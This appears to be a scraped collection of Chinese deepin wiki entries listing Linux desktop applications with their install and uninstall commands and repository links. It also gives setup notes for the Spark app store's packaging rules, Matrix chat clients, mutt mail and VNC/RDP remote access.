sudo apt-get install nautilus

sudo apt-get remove nautilus

http://packages.deepin.com/deepin/pool/main/n/nautilus/

标题：PCManFM
PCMan File Manager（PCManFM） 是 LXDE 桌面默认的文件管理器，您可以使用它来浏览硬盘、U 盘、SD 卡和其他存储设备中的内容，也可以方便快捷地创建、移动、删除文件和文件夹。

安装PCManFM的命令为`sudo apt-get install pcmanfm`

卸载PCManFM的命令为`sudo apt-get remove pcmanfm`

PCManFM的仓库地址是http://packages.deepin.com/deepin/pool/main/p/pcmanfm/

PCManFM的官方网站为https://sourceforge.net/projects/pcmanfm/

标题：PCManFM-Qt
PCMan File Manager Qt ( PCManFM-Qt) 是 LXQT 桌面默认的文件管理器，PCMan File Manager的QT移植版，您可以使用它来浏览硬盘、U 盘、SD 卡和其他存储设备中的内容，也可以方便快捷地创建、移动、删除文件和文件夹。

PCMan File Manager Qt ( PCManFM-Qt) 是 LXQT 桌面默认的文件管理器，PCMan File Manager的QT移植版。

PCManFM-Qt的安装命令是：sudo apt-get install pcmanfm-qt

PCManFM-Qt的卸载命令是：sudo apt-get remove pcmanfm-qt

PCManFM-Qt的仓库地址是：http://packages.deepin.com/deepin/pool/main/p/pcmanfm-qt/

PCManFM-Qt的官方网站是：https://github.com/lxqt/pcmanfm-qt

标题：Rox-Filer
Rox-Filer 是一个文件管理器，您可以使用它来浏览硬盘、U 盘、SD 卡和其他存储设备中的内容，也可以方便快捷地创建、移动、删除文件和文件夹。安装命令为：sudo apt-get install rox-filer。卸载命令为：sudo apt-get remove rox-filer。仓库地址为：http://packages.deepin.com/deepin/pool/main/r/rox/。官方网站为：http://rox.sourceforge.net/desktop/ROX-Filer/。

标题：Thunar
Thunar is a modern file manager for the Xfce Desktop Environment. Thunar has been designed from the ground up to be fast and easy to use. Its user interface is clean and intuitive and does not include any confusing or useless options by default. Thunar starts up quickly and navigating through files and folders is fast and responsive.

Thunar plugins can be installed as separate, additional packages in order to extend the functionality of Thunar. Most Thunar plugins offer additional options on files in the context menu or via shortcut. The interface which is used by thunar plugins is the thunarx API. Since thunar version 4.17.8 it is possibly to define a list of plugin directories via the environment variable THUNARX_DIRS (separated by colon)

Bulk Renamer – rename multiple files at once; Custom Actions – custom commands associated with common mime-types or extensions; Archive Plugin (thunar-archive-plugin) – allows to create and extract archive files; Media Tags Plugin (thunar-media-tags-plugin) – improved support for ID3 tags; Shares Plugin (thunar-shares-plugin) – Quickly share folders using Samba without requiring root access; Volume Manager (thunar-volman) – Automatic management of removable devices in Thunar; VCS Plugin (thunar-vcs-plugin) – adds Subversion and GIT actions to the context menu; Unofficial plugins: thunar-gtkhash – desktop utility for computing message digests or checksums; rabbitvcs-thunar – svn/git version control

Thunar currently supports four different levels of debugging support, which can be setup using the configure flag –enable-debug (check the output of configure –help). The levels are: full (for debugging to locate a bug, slow build, recommended for developers), yes (adds checks, slower, for developing extensions), minimum (default for release builds, recommended), no (disables all sanity checks, use carefully)

Thunar supports the following standards/specifications: XDG Base Directory Specification, Shared MIME Database Specification, X Direct Save (XDS) Protocol for the X Window System, Icon Theme Specification, Thumbnail Managing Standard, File URI Specification, Desktop Trash Can Specification

Thunar depends on the following packages: perl, GTK+, GLib, exo, libxfce4util, libxfce4ui, xfconf, intltool. It can optionally be built with: D-Bus (strongly suggested, for inter process communication), xfce-panel (required for trash panel applet), gudev (required for thunar-volman), libnotify (required for mount notification support)

Latest Release: thunar 4.20.4 released (2025/07/18 17:39). Source Code Repository: https://gitlab.xfce.org/xfce/thunar. Reporting Bugs: List of currently open bugs and instructions on how to submit new bug reports

Thunar 是 Xfce桌面默认的文件管理器，用户可以使用它来浏览硬盘、U 盘、SD 卡和其他存储设备，以及创建、移动、删除文件和文件夹。安装Thunar的命令为 sudo apt-get install thunar。卸载命令为 sudo apt-get remove thunar。仓库地址为 http://packages.deepin.com/deepin/pool/main/t/thunar/，官方网站为 https://docs.xfce.org/xfce/thunar/start。

标题：GkDebconf
GkDebconf基本上是一个图形化的前端，在Debian系统上用Debconf重新配置软件包的助手。您可以使用它轻松的重新配置已安装的软件包，摆脱使用命令行操作的烦恼。

安装： sudo apt-get install gkdebconf

卸载： sudo apt-get remove gkdebconf

仓库地址： http://packages.deepin.com/deepin/pool/main/g/gkdebconf/

标题：星火应用商店
由深度科技论坛 @shenmo 发起的星火工作组致力于丰富 Linux 生态，取“星星之火，可以燎原”之意，组建了星火应用商店。是个年轻的团队，大部分成员是 00 后，有小学生，中学生，大学生，来自五湖四海。

星火商店支持：Deepin 20; Ubuntu 20.04 LTS; UOS Home 20

星火应用商店官网：https://spark-app.store/；星火商店仓库地址：https://gitee.com/deepin-community-store/spark-store

国内的Linux应用比较少，wine应用难以获取，优质工具分散在民间各大论坛，无法形成合力，难以改善生态。生态构建需要人人行动起来，汇聚星火，产生燎原之势，而非某一方的单打独斗。

星火商店交流群号为872690351；有意向参与开发的人员，需在该交流群中@管理员来申请进入内部开发群。

用户可点击链接https://upload.deepinos.org/进行星火应用商店的应用投递，投递需参照对应的投递标准。

投递应用时，软件包名选择的分类与现有记录一致则替换对应记录，不一致则视为新软件包；更新时选错分类会导致无法正确覆盖，可通过获取spk链接并检查第三字段（spk://store/这里/xxxxx）获取原有分类信息。

星火商店新仓库同时维护两套软件源，替换版本时按Package替换文件；当投递应用填写的联系邮箱与现有记录一致时，视为版本升级并更新记录。

投递开源软件需遵循其开源协议；投递商业软件仅可选择官网免费下载（下载无需付费）的类型，拆包打包不可修改官方二进制文件及配置，不可投递已购买的付费商业软件；试用版商业软件不可包含序列号、激活程序等可能减少版权方获益的内容和程序。

星火应用商店投递的应用需满足三项内容要求：不触犯中华人民共和国现行法律、不影响操作系统及其他软件运行、安装与卸载干净。

生成符合规范的软件包可使用指令dpkg -b . ../；包名需用lintian检查，不出现bad-package-name即通过（其他错误可暂忽略），审核已加lintian自动检查，不通过会直接拒绝且人工无法干预。

从官方获取的deb包可不修改；自己打包或拆包打包后的deb包名（Package Name）不可与官方一致，可命名为“官方包名”+”.spark”。

Ubuntu软件包命名遵循①_②-③_④.deb约定，其中①为软件包名称（Package Name）、②为版本（Version Number）、③为修订号（Build Number）、④为平台（Architecture）；平台Architecture包含i386（x86的32位程序）、amd64（x86的64位程序）、all（平台无关）。

软件包名仅可包含小写字母（a-z）、数字（0-9）、加号（+）、减号（-）、点号（.）；最短2字符，必须以字母开头，不可与仓库软件包名冲突，建议长度控制在30字符以内。

以spark-store_3.0.3-11_amd64.deb为例，其中Package Name为spark-store，Version Number为3.0.3，Build Number为11，Architecture为amd64。

deb包的control文件字段建议首字母大写（如Package、Version）；Package、Version、Architecture、Maintainer、Description是deb文档强制要求包含的字段。

control文件各字段用途：Package是包名（相当于软件名，用于apt卸载安装）、Version是版本（用于更新）、Architecture是平台、Maintainer是维护者、Description是包的用途说明。

桌面应用程序（有GUI）投递的deb包需含.desktop文件，且安装后需位于/usr/share/applications/下或在此位置有软链接以确保桌面正确识别；.desktop文件必须包含Name（名称）、Exec（执行命令）、Icon（图标名称或绝对路径）、Type（类型，一般为Application）字段。

生成.desktop文件可在星火商店下载“桌面快捷方式编辑器”，或通过在线链接https://www.freedesktop.org/software/appstream/metainfocreator/#/guiapp；desktop文件名需与包名一致（如web.douyin.com的desktop文件名为web.douyin.com.desktop）。

验证.desktop文件可使用命令desktop-file-validate *.desktop，该命令依赖desktop-file-utils工具；安装该工具的命令为sudo apt install desktop-file-utils。

星火应用商店于2023-02-22T09:05:50.603Z发布，dateCreated（创建日期）为2022-06-16T03:00:39.972Z，编辑工具为markdown。

投递时，软件包名选择的分分类现有记录一致时，此时会替换对应的记录；不一致则认为是新的软件包。在更新时如果选错分类，则会无法正确覆盖。你可以获取spk链接并检查第三字段（spk://store/这里/xxxxx）来获取原有的分类信息

包名必须规范，可以使用lintian进行包名检查，如果不出现bad-package-name即可通过（其它错误可暂时忽略），现在审核已经加上了lintian的自动检查，如果不通过会直接被拒绝，人工无法干预

从官方直接获取的deb包可不做修改，自己打包或者拆包打包后的包名(Package Name)不可与官方一致，可考虑命名为“官方包名”+”.spark”

desktop文件名应当和包名一致（比如web.douyin.com的desktop文件名应当是web.douyin.com.desktop）

标题：VYM
VYM是一款思维导图软件，安装非常简单，而且VYM的兼容性很好。目前，VYM作为FreeMind 的最佳替代品，可以用来帮助您整理思绪，透过将思路图形化、结构化，来使您的办公效率得到大大提高。

安装VYM的命令是：sudo apt-get install vym

卸载VYM的命令是：sudo apt-get remove vym

VYM的仓库地址是：http://packages.deepin.com/deepin/pool/main/v/vym/

`sudo apt-get install vym`

`sudo apt-get remove vym`

[http://packages.deepin.com/deepin/pool/main/v/vym/](http://packages.deepin.com/deepin/pool/main/v/vym/)

标题：XMind
XMind是一款全球领先的思维导图软件，除了可以轻松绘制基本逻辑图之外，还支持结构图、树状图、思维导图、鱼骨图、二维图等模型。XMind可以将您的图形显示给他人，或者将图形内容导出到Powerpoint、Word中，令复杂的思想和信息得到更快的交流。XMind在企业和教育领域都有很广泛的应用。

sudo apt-get install xmind

sudo apt-get remove xmind

http://packages.deepin.com/deepin/pool/non-free/x/xmind/

标题：YEd_Graph_Editor
yEd Graph Editor是一款流程图绘制工具，可以很方便的创建流程图， UML 图表，意向图以及其它类型的图表，图形和网络结构图。内置丰富的素材和工具，支持自动布局功能，可以轻松导入XML、GEDCOM、GML等格式文件，也可以将内容保存，打印或者导出为多种主流格式。

sudo apt-get install yed

sudo apt-get remove yed

http://packages.deepin.com/deepin/pool/contrib/y/yed/

相关链接: 维基百科

标题：亿图图示
亿图图示是一款综合图形图表制作应用，它包含丰富的实例和模版，帮助您轻松创建流程图、网络拓扑图和平面布局图等。采用更智能和人性化的绘制方式，包括丰富的图形模板库和特色实例库，帮助设计者降低工作量，快捷阐述设计思想。软件格式兼容主流办公软件，可以很方便的把设计结果插入到Office文档或者导出成PDF格式。

亿图图示的安装命令为：sudo apt-get install edrawmax-zh；sudo apt-get install edrawmax-en

亿图图示的卸载命令为：sudo apt-get remove edrawmax-zh；sudo apt-get remove edrawmax-en

亿图图示中文版本的仓库地址为：http://packages.deepin.com/deepin/pool/main/e/edrawmax-zh/；英文版本的仓库地址为：http://packages.deepin.com/deepin/pool/main/e/edrawmax-en/

标题：滴答清单
滴答清单，一款轻便的待办事项(Todo)、日程管理(GTD)应用，全球逾千万用户的共同选择。它可以帮你制定项目计划、设置会议提醒、安排行程规划、保持工作专注，还能用于记录备忘、整理购物清单。滴答清单集计划表、备忘录、日程清单、笔记、便签、闹钟、日历、番茄钟、在线协作多种实用功能于一体，是你高效办公、目标管理、习惯养成及便捷生活的得力助手。

wget https://cdn.dida365.cn/download/linux/linux_deb_x64/dida-1.0.20-amd64.deb sudo apt install ./dida-1.0.20-amd64.deb

sudo apt remove --purge dida

滴答清单官网：https://dida365.com/

标题：GanttProject
GanttProject是一款项目计划和管理图绘制应用。可让你轻松绘出甘特图，可输出 PNG/JPG 图片格式、HTML 网页，或是 PDF 档案格式。你能输入项目的可用资源、里程碑、任务/子任务，以及任务的起始日期、持续时间、相依性、进度、备注等等，并且在甘特图上显示出来。

sudo apt-get install ganttproject

sudo apt-get remove ganttproject

http://packages.deepin.com/deepin/pool/non-free/g/ganttproject/

标题：腾讯会议
腾讯会议是腾讯基于21年音视频通讯经验、并依托于腾讯云全球化网络部署出品的简单易用、高清流畅、安全可靠的云会议协作平台。界面清爽，操作简单，在线文档协作、小程序入会、会管会控、屏幕共享等功能一应俱全，让您随时随地、秒级入会，提升会议效率。

sudo apt install com.qq.wemeet

sudo apt remove --purge com.qq.wemeet

腾讯会议官网：https://meeting.tencent.com/

标题：微信
微信（WeChat）是腾讯公司于2011年1月21日推出的一个为智能终端提供即时通讯服务的免费应用程序，由张小龙所带领的腾讯广州研发中心产品团队打造。微信支持跨通信运营商、跨操作系统平台通过网络快速发送免费（需消耗少量网络流量）语音短信、视频、图片和文字，同时，也可以使用通过共享流媒体内容的资料和基于位置的社交插件“摇一摇”、“朋友圈”、”公众平台“、”语音记事本“等服务插件。

同样的，只有Windows和安卓版本可下载，官方没有支持Linux版本

标题：腾讯QQ-已合并
QQ是腾讯开发的一款基于Internet的即时通信软件。支持在线聊天、视频电话、点对点断点续传文件、网络硬盘等多种功能。QQ作为一种方便、高效的聊天工具，是中国目前使用最广泛的即时通信软件。

sudo apt-get install deepin.com.qq.im

sudo apt-get remove deepin.com.qq.im

http://packages.deepin.com/deepin/pool/non-free/d/deepin.com.qq.im

相关链接

标题：腾讯TIM
TIM是精简版本的QQ。官方没有提供linux下载版本，但有windows版和安卓版。下载地址：https://office.qq.com/download.html

标题：腾讯通-已合并
腾讯通是一个企业级的实时通信平台，它通过丰富的沟通方式为企业内办公、企业商务提供服务，支持文本会话、语音/视频交流、手机短信、文件传输、IP电话、网络会议、以及应用程序共享、电子白板等远程协作功能。

sudo apt-get install apps.com.qq.rtxclient

sudo apt-get remove apps.com.qq.rtxclient

http://packages.deepin.com/deepin/pool/non-free/a/apps.com.qq.rtxclient/

标题：BearyChat-已合并
BearyChat是一款为工作场景设计的团队沟通工具，它支持自主创建公开或私密讨论组、历史消息全局搜索、文件存储管理、重要信息收藏、第三方服务集成等功能。

sudo apt-get install bearychat

sudo apt-get remove bearychat

http://packages.deepin.com/deepin/pool/main/b/bearychat/

标题：HexChat-已合并
HexChat是基于XChat的一款聊天工具，支持多种网络连接模式，可以自动连接、自动加入频道和自动生成ID，支持拼写检查和DCC文件传输等。

sudo apt-get install hexchat

sudo apt-get remove hexchat

http://packages.deepin.com/deepin/pool/main/h/hexchat/

标题：HipChat-已合并
HipChat是一款专为团队内部群聊设计的聊天工具，您可以创建群组或一对一聊天，同时还提供视频聊天、屏幕共享等功能。HipChat还整合了团队文件管理和分享以及拖拽完成保存等相关操作。

sudo apt-get install hipchat

sudo apt-get remove hipchat

http://packages.deepin.com/deepin/pool/non-free/h/hipchat/

HipChat是一款专为团队内部群聊设计的聊天工具，提供创建群组或一对一聊天，视频聊天、屏幕共享等功能，并整合了团队文件管理和分享操作。

在Deepin系统安装命令：sudo apt-get install hipchat

卸载命令：sudo apt-get remove hipchat

软件包仓库地址：http://packages.deepin.com/deepin/pool/non-free/h/hipchat/

标题：Matrix
Matrix 是一个开源、开放、轻量级、去中心化的即时聊天通讯协议，它是包括 deepin、Mozilla、Fedora、KDE、Archlinux、Debian 等开源社区均在广泛使用的即时聊天协议。

任何社区均可以搭建自己的 Matrix 实例，您可以在任何社区的 Matrix 实例中注册帐号，并登录其实例，并且您可以使用同一个帐号即可加入不同实例之中的聊天室。

如果您还没有在任何实例注册过 Matrix 帐号，您可以考虑在下面列表中的任意一个实例中注册帐号：- deepin (推荐)：[账号申请](mailto:support@deepin.org) | [登录地址](https://chat.getdeepin.org)- Mozilla（推荐）：https://chat.mozilla.org/#/welcome- Fedora Project：https://chat.fedoraproject.org/- openSuSE：https://chat.opensuse.org/- Open Desktop：https://chat.opendesktop.org/- Element (即 matrix.org 实例)：https://app.element.io/

注册后即可登录其对应的网页版在线聊天了。deepin实例的账号申请需要写名申请理由和要申请的matrix账户ID。

Element 是 Matrix 官方性质的，基于 Web 技术的 Matrix 客户端实现，除了网页环境外，也有桌面客户端可用。可以在你所使用的发行版的应用商店或包管理工具中搜索 `element-desktop` 或近似名称来检索和安装此客户端，然后即可运行并登录你的帐号。

若您所使用发行版未做任何额外配置，则 Element 客户端默认会尝试连接 `matrix.org` 实例。若您所处的环境无法直接连接 matrix.org，则可能在打开 Element 后看到 `Your Element is misconfigured` 的提示。此时，可通过在 ~/.config/Element/config.json 创建内容如下的文件，然后尝试重新启动 Element 客户端即可：{"default_server_name": "deepin.org"} 值得注意的是，在登录前，您可能需要编辑 Home Server 到您所注册时所使用的实例所对应的位置。例如假设您使用了 Mozilla 的实例，则需要编辑修改为 `mozilla.modular.im`。

Nheko Reborn 是一个基于 Qt/QML 技术的 Matrix 客户端，包含了包括 E2EE 在内的广泛的 Matrix 已有特性的支持，且支持主流平台。NeoChat 是 KDE 社区提供的，基于 Qt/QML 技术的 Matrix 客户端，包含了社区常用的大部分 Matrix 特性，以及实验性的 E2EE 支持。

你可以访问 [Clients](https://matrix.org/clients/) 页面了解已知的 Matrix 客户端列表。如果你推荐使用某个客户端，也可以编辑此 Wiki 页面，将客户端的名字加到这个列表中来，来进行详细的介绍。

社区通常通过“Space（空间）”索引自己社区所包含的聊天室列表，您可以加入对应的 Space 来检索感兴趣的聊天室，也可以直接检索并加入感兴趣的聊天室。下面是一些推荐的空间与聊天室，可供参考：- [deepin 社区空间](https://matrix.to/#/#deepin-space:matrix.org)：`#deepin-space:matrix.org`- [Fedora 社区空间](https://matrix.to/#/#fedora-space:fedoraproject.org)：`#fedora-space:fedoraproject.org`- [KDE 社区空间](https://matrix.to/#/#kde-community:kde.org)：`#kde-community:kde.org`

Matrix 原生支持将已有的 Matrix 聊天室桥接到 IRC/Telegram/Discord 等的群聊之中，以供 Matrix 用户可以直接和现有平台的用户进行沟通。您可以使用公开的桥接服务，也可以自己编写桥接服务来桥接已有的聊天室。

主流的 IRC 聊天平台，包括 libera.chat 与 OFTC 等，均提供了现有的桥接服务可用，可参见 [这个页面](https://matrix-org.github.io/matrix-appservice-irc/latest/bridged_networks.html) 了解详细的说明。

[t2bot.io](https://t2bot.io/) 提供了将 Matrix 聊天室桥接到 Telegram 群聊与 Discord 群聊的公开服务，可前往其网站进行了解。手动的桥接操作通常需要聊天室的管理员进行操作。

任何社区均可以搭建自己的 Matrix 实例，您可以在任何社区的 Matrix 实例中注册帐号，并登录其实例，并且您可以使用同一个帐号即可加入不同实例之中的聊天室。如果您还没有在任何实例注册过 Matrix 帐号，您可以考虑在下面列表中的任意一个实例中注册帐号：- deepin (推荐)：[账号申请](mailto:support@deepin.org) | [登录地址](https://chat.getdeepin.org) - Mozilla（推荐）：https://chat.mozilla.org/#/welcome - Fedora Project：https://chat.fedoraproject.org/ - openSuSE：https://chat.opensuse.org/ - Open Desktop：https://chat.opendesktop.org/ - Element (即 matrix.org 实例)：https://app.element.io/

Element 是 Matrix 官方性质的，基于 Web 技术的 Matrix 客户端实现，除了网页环境外，也有桌面客户端可用。可以在你所使用的发行版的应用商店或包管理工具中搜索 `element-desktop` 或近似名称来检索和安装此客户端，然后即可运行并登录你的帐号。若您所使用发行版未做任何额外配置，则 Element 客户端默认会尝试连接 `matrix.org` 实例。若您所处的环境无法直接连接 matrix.org，则可能在打开 Element 后看到 `Your Element is misconfigured` 的提示。此时，可通过在 ~/.config/Element/config.json 创建内容如下的文件，然后尝试重新启动 Element 客户端即可： {"default_server_name": "deepin.org"}

社区通常通过“Space（空间）”索引自己社区所包含的聊天室列表，您可以加入对应的 Space 来检索感兴趣的聊天室，也可以直接检索并加入感兴趣的聊天室。下面是一些推荐的空间与聊天室，可供参考：- [deepin 社区空间](https://matrix.to/#/#deepin-space:matrix.org)：`#deepin-space:matrix.org` - [Fedora 社区空间](https://matrix.to/#/#fedora-space:fedoraproject.org)：`#fedora-space:fedoraproject.org` - [KDE 社区空间](https://matrix.to/#/#kde-community:kde.org)：`#kde-community:kde.org`

Matrix 原生支持将已有的 Matrix 聊天室桥接到 IRC/Telegram/Discord 等的群聊之中，以供 Matrix 用户可以直接和现有平台的用户进行沟通。您可以使用公开的桥接服务，也可以自己编写桥接服务来桥接已有的聊天室。主流的 IRC 聊天平台，包括 libera.chat 与 OFTC 等，均提供了现有的桥接服务可用。t2bot.io 提供了将 Matrix 聊天室桥接到 Telegram 群聊与 Discord 群聊的公开服务。

标题：Pidgin
Pidgin是一款即时通讯软件，它允许您同时使用多个IM账号登录，包括QQ、MSN、Yahoo！、IRC等。Pidgin支持很多常见的网络功能，包括文件传输、离开状态、输入信息提示以及MSN窗口关闭提示。安装：sudo apt-get install pidgin，卸载：sudo apt-get remove pidgin，仓库地址：http://packages.deepin.com/deepin/pool/main/p/pidgin/。相关链接：维基百科：

标题：Xchat-已合并
Xchat是一款跨平台的IRC通讯协议软件，有着良好的用户界面，具备常用的聊天功能，利用它您可以登录到任何的IRC服务器与别人交流。安装命令：sudo apt-get install xchat。卸载命令：sudo apt-get remove xchat。软件仓库地址：http://packages.deepin.com/deepin/pool/main/x/xchat/。相关链接包括维基百科等资源。

标题：安司密信-已合并
安司密信是一款社交应用，支持即时信息发送以及网络通话功能，所有数据都经过安司密盾的高强度加密，以便有效抵御外部黑客和第三方组织的恶意攻击。开启安司密信安全模式后，所有文字、语音、图片、视频信息都会经过高强度加密之后发送给好友。支持绝密会话、阅后即焚、远程销毁等功能。

安装：sudo apt-get install akeychat

卸载：sudo apt-get remove akeychat

仓库地址：http://packages.deepin.com/deepin/pool/main/a/akeychat/

标题：阿里旺旺-已合并
阿里旺旺是一款专为淘宝会员量身定做的个人交易沟通软件，它能方便进行买家和卖家的实时沟通，提供文字聊天、语音聊天、视频聊天、文件传输、发送离线文件等功能。

sudo apt-get install apps.com.taobao.aliclient.wangwang

sudo apt-get remove apps.com.taobao.aliclient.wangwang

http://packages.deepin.com/deepin/pool/non-free/a/apps.com.taobao.aliclient.wangwang/

标题：Evolution-已合并
Evolution是一款电子邮件和日程安排工具，为用户提供了一整套高效的个人和工作组信息管理方案，多年来一直深受Linux用户的好评。通过它您可以阅读和发送E-Mail，管理个人联系簿，在线创建和确认群组会议等。

sudo apt-get install evolution

sudo apt-get remove evolution

http://packages.deepin.com/deepin/pool/main/e/evolution/

维基百科：

标题：Geary-已合并
Geary是一款桌面电子邮件客户端程序，它支持基本的查看和撰写、预览、回复等电子邮件基本功能，同时还支持IMAP协议，可以使用Google, Yahoo和Microsoft等其他在线邮箱服务。

sudo apt-get install geary

sudo apt-get remove geary

[http://packages.deepin.com/deepin/pool/main/g/geary/](http://packages.deepin.com/deepin/pool/main/g/geary/)

http://packages.deepin.com/deepin/pool/main/g/geary/

维基百科：

标题：mutt
mutt是一款古老而强大的TUI邮件用户代理（MUA），有着非常强大的定制性。neomutt则是fork自mutt并添加了些新功能。

安装mutt的命令是：apt install mutt；安装neomutt的命令是：apt install neomutt。

POP3是把邮件下载到本地，对邮件操作（如删除）不影响服务器上的邮件。相关配置包括：set pop_authenticators = 'user'；set pop_host = 'pops: 邮件服务器:995'（完整标准URL格式为协议: [用户名[:密码]@]邮件服务器域名或ip[:端口]）；set pop_user = '用户名'；set pop_pass = '密码'。

IMAP会同步邮件的状态，对邮件操作（如删除）将会影响到服务器上的邮件。相关配置包括：set folder = 'imaps: 邮件服务器:993'（完整标准URL格式为协议: [用户名[:密码]@]邮件服务器域名或ip[:端口]）；set imap_user = '用户名'；set imap_pass = '密码'。

smtp是发送邮件用的。相关配置包括：set smtp_url = 'smtp: 邮件服务器:25'；set smtp_user = '用户名'；set smtp_pass = '密码'。

官方手册建议，多账户使用时应视为上个使用的邮箱不可知，所以要清空当前连接账户，然后再连下一个账号。账户钩子配置示例：account-hook . 'unset imap_user; unset imap_pass; unset tunnel'；account-hook imap: host1/ 'set imap_user=me1 imap_pass=foo'等。邮箱和目录钩子配置示例：mailboxes imap: user@host1/INBOX；folder-hook imap: user@host1/ 'set folder=imap: host1/ ; set record=+INBOX/Sent'等。

外观设置中的格式化字符包括：%y表示年，%m表示月，%d表示日，%H表示时，%M表示分，%S表示秒。

index_format中的部分字符串及其意义：%a表示发件人地址，%A表示回复地址（如果存在；否则：发件人地址），%b表示原始邮件文件夹的文件名（类似邮箱），%c表示消息正文中的字符数（字节），%s表示消息的主题。

flag_chars中部分字符的默认选项和描述：1的默认选项是*，描述为邮件被标记了；2的默认选项是!，描述为邮件被标记为重要；3的默认选项是D，描述为邮件被标记为删除；5的默认选项是r，描述为邮件已回复。

标题：Nylas_N1-已合并
Nylas N1是一个开源的邮件客户端，它支持插件框架，可以扩展创建强大的新功能，它兼容上百个邮件服务提供商，提供良好的程序外观并具有离线功能。安装使用sudo apt-get install nylas命令，卸载使用sudo apt-get remove nylas命令。其仓库地址是http://packages.deepin.com/deepin/pool/main/n/nylas/。

标题：Thunderbird-已合并
简介
雷鸟邮件是一个邮件客户端，支持IMAP 、POP邮件协议以及HTML邮件格式，可以整合多个网络邮箱于一体，让您在本地随时都能接收或者发送邮件。
安装
sudo apt-get install thunderbird
卸载
sudo apt-get remove thunderbird
仓库地址
http://packages.deepin.com/deepin/pool/main/t/thunderbird/
常见问题

相关链接
维基百科：已合并

标题：VNC在linux下的搭建和连接
服务器上安装x11vnc，构建vnc的服务端：sudo apt-get install x11vnc。设置并存储vnc连接密码为deepin：sudo x11vnc -storepasswd deepin /etc/x11vnc.pass。启动x11vnc服务端：sudo x11vnc -display :0 -auth /var/run/lightdm/root/:0 -forever -bg -o /var/log/x11vnc.log -rfbauth /etc/x11vnc.pass -shared -noxdamage -xrandr "resize" -rfbport 5900。

客户端安装并启动remmina：sudo apt-get install remmina -y；remmina。选择VNC服务，直接输入服务端的IP，输入前面服务端设置的连接密码进行连接即可。

标题：KRDC
KRDC 是 KDE 的远程控制软件客户端。在2007年的Google夏日代码大赛（SoC）中，Urs Wolfer 和其他开发者对 KRDC 进行了重大调整。支持Virtual Network Computing（VNC）和远程桌面协议（RDP），因此可以使用这个软件对 Unix-like 和 Windows 个人电脑进行访问。

安装：sudo apt install krdc

卸载：sudo apt remove --purge krdc

仓库地址：http://packages.deepin.com/deepin/pool/main/k/krdc/

相关链接：维基百科：https://zh.wikipedia.org/zh-cn/KRDC

标题：Remmina-已合并
Remmina是一个远程桌面客户端，它提供了RDP、VNC、XDMCP、SSH等远程连接协议的支持。其优点在于界面清爽，方便易用。安装：sudo apt-get install remmina。卸载：sudo apt-get remove remmina。仓库地址：http://packages.deepin.com/deepin/pool/main/r/remmina/。

标题：TeamViewer-已合并
TeamViewer是一个用于远程控制、桌面共享和文件传输的简单且快速的解决方案。它具有即时远程控制、远程维护、远程访问、家庭办公、在线会议/演示等功能。

sudo apt-get install teamviewer

sudo apt-get remove teamviewer

http://packages.deepin.com/deepin/pool/non-free/t/teamviewer/

请尽量使用深度商店提供的TeamViewer。由于系统自带的软件包安装程序存在逻辑问题，双击从官网下载的TeamViewer的deb安装包安装将可能导致深度桌面环境被卸载。安装下载的deb包，请尽量使用命令：`sudo dpkg -i xxx.deb` 并注意相应提示。

维基百科：https://zh.wikipedia.org/wiki/TeamViewer

标题：ToDesk
ToDesk 是一款安全实用且流畅的远程控制软件，可以轻松实现远程控制、文件传输等一系列操作，提升工作生活的效率，为远程客户提供技术支援。

wget https://dl.todesk.com/linux/todesk_4.1.0_amd64.deb
sudo apt install ./todesk_4.1.0_amd64.deb

sudo apt remove --purge todesk

Todesk 官方网站：https://www.todesk.com/

标题：VNC-Client
VNC-Client是一款远程连接应用，通过该软件可以远程控制计算机，还可以将远程连接保存为书签，对远程计算机进行截屏；支持显示模式和背景主题设置。

sudo apt-get install evnc

sudo apt-get remove evnc

http://packages.deepin.com/deepin/pool/main/e/evnc/

标题：默认远程桌面
可以在应用商店安装这个远程协助的APP进行连接

均可以在应用商店安装

安装Remmina然后进行连接。在终端输入`sudo apt install remmina`即可安装，安装完后在启动器打开并连接需要连接的计算机即可

使用rdesktop工具，在终端输入`sudo apt install rdesktop`即可安装，然后终端输入`rdesktop 远程PCIP地址`即可访问

也可以试试这个：https://gitee.com/gfdgd-xi/simple-remote-desktop-accessor

在应用商店安装VNC View然后使用即可

可以使用Windows 10的openssh，在Windows PowerShell输入ssh ip即可。如果没有ssh，也可以安装一个git然后使用git的bash里面的ssh来使用

在Windows安装MobaXterm等第三方工具然后连接

终端输入ssh ip即可，或者deepin终端的连接远程服务器功能

使用其它的ssh工具

输入`sudo apt install x11vnc`安装vnc访问，然后输入`x11vnc`（加-forever可以让设备断开后不关闭vnc服务）即可

终端输入以下命令安装xrdp访问：`sudo apt install xrdp`；然后输入以下命令启动服务：`sudo service xrdp start`；接着输入以下命令配置xrdp文件：`echo "startdde-x11" > .xsession`；最后注销该用户用rdp远程软件访问即可

输入`rdesktop --help`也可以查看有关帮助

rdesktop: A Remote Desktop Protocol client. Usage: rdesktop [options] server[:port]

rdesktop常用参数包括：-u: user name；-p: password (- to prompt)；-f: full-screen mode；-a: connection colour depth；-z: enable rdp compression

UOS/Deepin PC互联通过应用商店安装APP实现，todesk和向日葵均可在应用商店安装。

访问SSH：Windows端可通过PowerShell输入 ssh ip 或安装MobaXterm；Linux端终端输入 ssh ip 或使用deepin终端的连接远程服务器功能。

rdesktop详细参数：基本用法 rdesktop [options] server[:port]，常用参数如 -u 用户名、-p 密码、-g 桌面分辨率、-f 全屏模式等。

标题：KeePass2
KeePass2是一个密码管理工具，能存储登录网站、电子邮件、FTP传输等密码，还带有密码生成器。

安装KeePass2的命令是sudo apt-get install keepass2。

卸载KeePass2的命令是sudo apt-get remove keepass2。

KeePass2的仓库地址是http://packages.deepin.com/deepin/pool/main/k/keepass2/。

标题：KeePassX
KeePassX是一个密码管理工具，能存储登录网站、电子邮件、FTP传输等密码信息，还有方便的密码生成器。

安装KeePassX的命令是sudo apt-get install keepassx。

卸载KeePassX的命令是sudo apt-get remove keepassx。

KeePassX的仓库地址是http://packages.deepin.com/deepin/pool/main/k/keepassx/。

标题：GtkHash
GtkHash是计算消息摘要和checksum的工具，支持MD5、SHA1、SHA256、SHA512、RIPEMD、TIGER、WHIRLPOOL等哈希函数。

安装GtkHash的命令是sudo apt-get install gtkhash。

卸载GtkHash的命令是sudo apt-get remove gtkhash。

GtkHash的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gtkhash/。

标题：nftables相比iptables到底改变了什么
nftables统一了iptables、ip6tables、arptables、ebtables等工具族，基于Netfilter框架。

